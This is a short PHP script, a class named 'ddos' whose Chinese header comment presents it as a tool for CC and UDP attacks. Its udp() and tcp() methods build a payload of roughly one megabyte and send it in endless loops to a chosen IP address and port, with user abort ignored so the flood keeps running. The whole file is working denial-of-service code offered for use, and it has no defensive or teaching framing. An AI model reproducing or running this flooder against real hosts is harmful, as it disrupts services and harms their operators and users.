<?php
/*集合了cc攻击，udp攻击的一个php脚本，并有多种攻击实现方法
*有些主机可能禁用某些函数，那么攻击会失败
*/
class ddos {
	public $ip,$port;
	public function setsomething($ip,$port) {
		$this->ip = $ip;
		$this->port = $port;
		set_time_limit(60);
		error_reporting(E_ALL);
		ob_implicit_flush();
		ignore_user_abort(TRUE);
	}
	public function udp() {
		for($i=0;$i<65535;$i++){
			$out=$out.'organization54df';
		}
		for(;;){
			$fp=fsockopen("udp://$this->ip",$this->port,$errno,$errstr,5);
			if($fp){
				fwrite($fp,$out);
				fclose($fp);
			}
		}
	}
	public function tcp() {
		for($i=0;$i<65535;$i++){
			$out=$out.'organization54df';
		}
		for(;;){
			$fp=fsockopen("tcp://$this->ip",$this->port,$errno,$errstr,5);
			if($fp){
				fwrite($fp,$out);
				fclose($fp);
			}
		}
	}
}
?>
